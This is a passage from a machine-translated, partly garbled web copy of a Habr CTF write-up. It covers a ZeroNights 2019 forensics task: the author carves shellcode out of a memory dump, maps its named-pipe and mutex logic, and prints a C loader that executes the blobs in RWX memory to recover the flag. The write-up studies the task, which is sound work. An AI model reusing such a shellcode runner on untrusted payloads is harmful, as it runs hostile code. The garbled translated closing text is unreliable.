SIGN.MEDIA=1C1DAB0 zn_2019\note3.exe SIGN.MEDIA=1C30058 zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=1C30058 zn_2019\ConsoleApplication5.exe SIGN.MEDIA=1C30058 zn_2019\Injector2.exe SIGN.MEDIA=1C30058 zn_2019\Is_it_you_suspended_or_me.exe SIGN.MEDIA=1C30058 zn_2019\With_little_debug.exe SIGN.MEDIA=1C30058 zn_2019\injector.exe SIGN.MEDIA=1C30058 zn_2019\injector.exe SIGN.MEDIA=1C30058 zn_2019\not_so_sleepy_r_we.exe SIGN.MEDIA=1C30058 zn_2019\note.exe SIGN.MEDIA=1C30058 zn_2019\note2.exe SIGN.MEDIA=1C30058 zn_2019\note3.exe SIGN.MEDIA=1C89400 zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=1C89400 zn_2019\ConsoleApplication5.exe SIGN.MEDIA=1C89400 zn_2019\Injector2.exe SIGN.MEDIA=1C89400 zn_2019\Is_it_you_suspended_or_me.exe SIGN.MEDIA=1C89400 zn_2019\NOTE1.exe SIGN.MEDIA=1C89400 zn_2019\With_little_debug.exe SIGN.MEDIA=1C89400 zn_2019\im_spawned_you_so_i_should_kill_you.exe SIGN.MEDIA=1C89400 zn_2019\injector.exe SIGN.MEDIA=1C89400 zn_2019\nnnn.exe SIGN.MEDIA=1C89400 zn_2019\not_so_sleepy_r_we.exe SIGN.MEDIA=1C89400 zn_2019\note.exe SIGN.MEDIA=1C89400 zn_2019\note.exe SIGN.MEDIA=1C89400 zn_2019\note2.exe SIGN.MEDIA=1C89400 zn_2019\note3.exe SIGN.MEDIA=1C89400 zn_2019\note4.exe SIGN.MEDIA=1C8A800 zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=1C8A800 zn_2019\ConsoleApplication5.exe SIGN.MEDIA=1C8A800 zn_2019\Injector2.exe SIGN.MEDIA=1C8A800 zn_2019\Is_it_you_suspended_or_me.exe SIGN.MEDIA=1C8A800 zn_2019\NOTE1.exe SIGN.MEDIA=1C8A800 zn_2019\With_little_debug.exe SIGN.MEDIA=1C8A800 zn_2019\im_spawned_you_so_i_should_kill_you.exe SIGN.MEDIA=1C8A800 zn_2019\injector.exe SIGN.MEDIA=1C8A800 zn_2019\nnnn.exe SIGN.MEDIA=1C8A800 zn_2019\not_so_sleepy_r_we.exe SIGN.MEDIA=1C8A800 zn_2019\note.exe SIGN.MEDIA=1C8A800 zn_2019\note2.exe SIGN.MEDIA=1C8A800 zn_2019\note3.exe SIGN.MEDIA=1C8A800 zn_2019\note4.exe SIGN.MEDIA=2D702C zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=3EDC2 zn_2019\server\a.exe SIGN.MEDIA=3EDC2 zn_2019\server\hui.exe SIGN.MEDIA=3EDC2 zn_2019\server\run.exe SIGN.MEDIA=4482C zn_2019\ConsoleApplication5.exe SIGN.MEDIA=4482C zn_2019\PEview.exe SIGN.MEDIA=5B0058 zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=5B0058 zn_2019\ConsoleApplication5.exe SIGN.MEDIA=5B0058 zn_2019\Injector2.exe SIGN.MEDIA=5B0058 zn_2019\injector.exe SIGN.MEDIA=5B0058 zn_2019\note.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\Discord.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\Far.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\FileZillaFTPclient.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\InputDirector.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\KeePass.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\PicPick.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\Skype.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\UpdateManager.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\VBoxManager.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\idaq.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\javaw.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\lunix.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\paint.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\python3.7.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\r.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\svghost.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\tsm.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\usha.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\video_xxx_kopati4_nadaval_ogurcov_kroshu.mp4.exe SIGN.MEDIA=AB82C zn_2019\ConsoleApplication5.exe SIGN.MEDIA=AB82C zn_2019\injector.exe SIGN.MEDIA=B06D4C64 zn_2019\server\a.exe SIGN.MEDIA=B06D4C64 zn_2019\server\hui.exe SIGN.MEDIA=B06D4C64 zn_2019\server\run.exe SIGN.MEDIA=B06D4C64 zn_2019\server\video_xxx_kopati4_nadaval_ogurcov_kroshu.mp4.exe SIGN.MEDIA=BA802 zn_2019\server\run.exe SIGN.MEDIA=E00058 zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=E00058 zn_2019\ConsoleApplication5.exe SIGN.MEDIA=E00058 zn_2019\Injector2.exe SIGN.MEDIA=E00058 zn_2019\injector.exe SIGN.MEDIA=E00058 zn_2019\note.exe SIGN.MEDIA=E00058 zn_2019\note2.exe SIGN.MEDIA=E00058 zn_2019\note2.exe SIGN.MEDIA=E9982 zn_2019\server\run.exe</code> </pre> <br><p style=";text-align:right;direction:rtl"> I used my old tool to get filesystem structure out of NTFS records (a lot of FILE records usually cached in RAM). </p><br><p style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/x7/bf/tq/x7bftqu47ozkqm1ps96i6luh9za.png"><br><img src="https://habrastorage.org/webt/u9/uo/mz/u9uomzuew2uy6ib7tdqpltzozao.png"></p><br><p style=";text-align:right;direction:rtl"> <strong>data_storage</strong> is small enough to contain some resident $DATA inside FILE record, so we can extract it. </p><br><p style=";text-align:right;direction:rtl"> This file contains shellcode. All it does is resolving CreateNamedPipeA by hash using special function (see Figure below) and calling it with <strong>"\.\pipe\zn_shell_stor"</strong> argument. </p><br><p style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/ag/d-/9v/agd-9vmbes5yrnupfxrucg9a3cs.png"></p><br><p style=";text-align:right;direction:rtl"> I highlighted part of this function, this bytes can be used to located other 24 shellcodes inside memory dump. </p><br><p style=";text-align:right;direction:rtl"> One of shellcode #21 contained references to other, it is probably the main one. </p><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">Global\vtHAjnNbCecOeNAnVeQFmdRw Global\jGzXXZJbXGPYniopljDEdwuD Global\jpBuyMNJzdnpwHimVlcBkwGo Global\ArlCJOxJFOKRkqOLcBhvjYqj Global\THxjCBohxSlNgCFbwJsHujqk Global\BOiJhsLFBuZdsFdCrLKEucpJ Global\iYxszVIFfsuzzEmGwgOQeEcb Global\NOluZoXPJalShopCCuNnWQbR Global\GCrtPmNEAOsZpSNNBdiYQfgz Global\pVVgeqcREhXSgKCwhkeyfTXw Global\trsQPehKvlxBJhEqIPtwzjxi Global\ngVrhgAEqcDssFsNerrAZsFz Global\KiZvGyiMnyTgvQdFNGcudfTY Global\FzXvKPKGCPMAERklFMXVMYga Global\nCZpFZPtyidhFOvVeemfyJAC Global\pjRmfOLLBXIbsJholoasvrqC Global\mhOVYcYRKgWdABAsgkvrcOOM Global\syGiShcLTXfQYGAAiafYBxoF Global\KbFVsPCPZrfVlUIQlvVoJLXW Global\XbuYiHCxQLTLApuToFldJIgI Global\auFqpIQAlsHcvjPEakqHyIeA Global\MrnXOMJvHmYBxRfkbLBUYWgn Global\GYVOmvrLhCpgQUPfnOshzzem Global\qaswedfrtghyujkiol121232 \\.\pipe\zn_shell_stor</code> </pre> <br><p style=";text-align:right;direction:rtl"> Every shellcode is started with CALL $+X instruction (E8 ?? ?? ?? ??), followed by data block and executable code. Code is looking for some functions and evaluates logic based on data read from pipe <strong>"\.\pipe\zn_shell_stor"</strong> . </p><br><div class="scrollable-table" style=";text-align:right;direction:rtl"><table style=";text-align:right;direction:rtl"><thead><tr><th> File </th><th> Tags </th><th> Mutex </th></tr></thead><tbody><tr><td> b1 </td><td> mov mov </td><td> Global\GCrtPmNEAOsZpSNNBdiYQfgz </td></tr><tr><td> b2 </td><td> SBOX "axfksyBLjRfMFZXdINqyTXcekgCxPRNpKtmTAj SUdmElMsuKYkmFYbJxSbXwxmvQ" </td><td> Global\NOluZoXPJalShopCCuNnWQbR </td></tr><tr><td> b3 </td><td> inc byte [rbp+0Ch] </td><td> Global\ngVrhgAEqcDssFsNerrAZsFz </td></tr><tr><td> b4 </td><td> repne scasb strlen() == 18 </td><td> Global\jpBuyMNJzdnpwHimVlcBkwGo </td></tr><tr><td> b5 </td><td>  ุุ </td><td> Global\ArlCJOxJFOKRkqOLcBhvjYqj </td></tr><tr><td> b6 </td><td> xor BUFFER "\x31\x2A\x72\xC8\x5E\x08\xC5\xFE \x07\x44\xCB\xEB\x76\x3B\xE1\x3A\x83" </td><td> Global\MrnXOMJvHmYBxRfkbLBUYWgn </td></tr><tr><td> b7 </td><td>  ุุ </td><td> Global\GYVOmvrLhCpgQUPfnOshzzem </td></tr><tr><td> b8 </td><td> cmp word [rbp+0Ch], 12h </td><td> Global\KbFVsPCPZrfVlUIQlvVoJLXW </td></tr><tr><td> b9 </td><td>  ุุ </td><td> Global\BOiJhsLFBuZdsFdCrLKEucpJ </td></tr><tr><td> b10 </td><td>  ุุ </td><td> Global\iYxszVIFfsuzzEmGwgOQeEcb </td></tr><tr><td> b11 </td><td> cmp </td><td> Global\pjRmfOLLBXIbsJholoasvrqC </td></tr><tr><td> b12 </td><td> add xor cl x2 </td><td> Global\nCZpFZPtyidhFOvVeemfyJAC </td></tr><tr><td> b13 </td><td> inc [rbp+0Ch] </td><td> Global\auFqpIQAlsHcvjPEakqHyIeA </td></tr><tr><td> b14 </td><td> dw[rbp+0Ch] = dw[rbp+0Ch] + dw[rbp+0Ch] </td><td> Global\syGiShcLTXfQYGAAiafYBxoF </td></tr><tr><td> b15 </td><td> WIN! Sleep Beep </td><td> Global\XbuYiHCxQLTLApuToFldJIgI </td></tr><tr><td> b16 </td><td> save byte </td><td> Global\mhOVYcYRKgWdABAsgkvrcOOM </td></tr><tr><td> b17 </td><td> add xor cl x2 </td><td> Global\FzXvKPKGCPMAERklFMXVMYga </td></tr><tr><td> b18 </td><td> zero rbp (0, 211h, 80h) </td><td> Global\trsQPehKvlxBJhEqIPtwzjxi </td></tr><tr><td> b19 </td><td>  ุุ </td><td> Global\KiZvGyiMnyTgvQdFNGcudfTY </td></tr><tr><td> b20 </td><td> Read from C:\beeps\flag.txt </td><td> Global\vtHAjnNbCecOeNAnVeQFmdRw </td></tr><tr><td> b21 </td><td> MAIN </td><td></td></tr><tr><td> b22 </td><td> Xor </td><td> Global\THxjCBohxSlNgCFbwJsHujqk </td></tr><tr><td> b23 </td><td> cmp dw[rbp+0Ch], 256 dec </td><td> Global\pVVgeqcREhXSgKCwhkeyfTXw </td></tr><tr><td> b24 </td><td> beep(1000, 1100) </td><td> Global\jGzXXZJbXGPYniopljDEdwuD </td></tr></tbody></table></div><br><p style=";text-align:right;direction:rtl"> Understanding of shellcode actions is a little bit hard because everything tied together via pipe (A calls B, B calls C and etc.). We are required to jump from one shellcode to another during reversing. </p><br><p style=";text-align:right;direction:rtl"> I decided to execute it all and see what happens. All shellcodes was saved as files <strong>bN</strong> , where N is a number in range from 1 to 24 in order of appearing in memory dump. Dump #21 is the main dispatcher (it must be loaded first). File <strong><em>C:\beeps\flag.txt</em></strong> should be present in system for #20 to work. </p><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">#include &lt;windows.h&gt; void load_shellcode(int index) { FILE* fp; DWORD dwThread; int size; CHAR filename[32]; sprintf_s(filename, "b%i", index); fopen_s(&amp;fp, filename, "rb"); fseek(fp, 0, SEEK_END); size = ftell(fp); fseek(fp, 0, SEEK_SET); LPVOID pMem = VirtualAlloc( NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE ); printf("Loaded %i | size=%i | at %p\n", index, size, pMem); fread(pMem, 1, size, fp); CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pMem, 0, 0, &amp;dwThread); fclose(fp); } int main() { load_shellcode(21); Sleep(1000); for (int i = 1; i &lt;= 24; i++) { if (i == 21) continue; load_shellcode(i); } while (1) Sleep(1000); }</code> </pre> <br><p style=";text-align:right;direction:rtl"> I created <strong>C:\beeps\flag.txt</strong> with some dummy content (length is 17 as hinted by one of the shellcodes) and also set a breakpoint at module doing xor with buffer (#6). </p><br><p style=";text-align:right;direction:rtl"> Program executed and flag showed up in memory after XOR operation. </p><br><p style=";text-align:right;direction:rtl"> Flag: <strong><em>zn{$ucH <em>SL0W</em> !pC}</em></strong> </p></div></div><br><p style=";text-align:right;direction:rtl">  sysenter    6 .   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u="></a> . </p><br><h2 style=";text-align:right;direction:rtl">  ุจุนุถ ุงูุฅุญุตุงุกุงุช </h2><br><p style=";text-align:right;direction:rtl">                .   136     . </p><br><p style=";text-align:right;direction:rtl">       . <br>       โ ASR-EHD  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">Digital Security</a> .      (AV1ct0r),     22 15   . </p><br><p style=";text-align:right;direction:rtl">     Protected Shell  RuCTFE.       โ 10.   vos,     1 26. </p><br><p style=";text-align:right;direction:rtl"> ,     .   12-13    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ZeroNights</a> . </p></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/ar472416/">https://habr.com/ru/post/ar472416/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../ar472404/index.html">2D ุญุณุงุจ ุงูุงุตุทุฏุงู: ุฎูุงุฑุฒููุฉ ุฌููุจุฑุช ุฌููุณูู ููุฑุชู</a></li>
<li><a href="../ar472406/index.html">ุชูุณูุน ูุฑูุฒ ุงูุจูุงูุงุช ุฃุซูุงุก ุชุณููู ุงูุจูุชุฒุง</a></li>
<li><a href="../ar472410/index.html">ุชุตููู ุฃูุธูุฉ ุงูุฃููุงู ุงููุชุงุญุฉ</a></li>
<li><a href="../ar472412/index.html">ูุญูู ุงููุธุงู ูููุงููุณ ุงูููุชุฌ - ูุฒ ูููู ููุณ ุงููุฒูุฌุ</a></li>
<li><a href="../ar472414/index.html">ุงูุชุงุฑูุฎ ุงูุทููู ูููุงุนูุงุช ุงููููุชุฑูู ุงูุณุฑูุนุฉ ููุนุฏ ุฏูุฑุฉ ุงููููุฏ ุงููุบููุฉ</a></li>
<li><a href="../ar472418/index.html">ููููุฉ ุงูุญูุงุธ ุนูู ุญููู ุงูุชูููุฉ ุงููุฎุตุตุฉ</a></li>
<li><a href="../ar472420/index.html">ุฌุนู ุงููุงุฌูุฉ ุฃูุซุฑ ุงุณุชุฌุงุจุฉ ุจูุถู ุงููุนุฏ ุงููุคุฌู</a></li>
<li><a href="../ar472422/index.html">Sber X RamblerFront & Meet Up</a></li>
<li><a href="../ar472426/index.html">ุฃุณุจูุน ุงูุฃูู 43: ุงูุญูุงุฉ ุงูุณุฑูุฉ ูุฅูุชุฑูุช ุงูุฃุดูุงุก Hanipots</a></li>
<li><a href="../ar472428/index.html">ูุดุบู ุชุงุฑุงูุชูู kubernetes</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>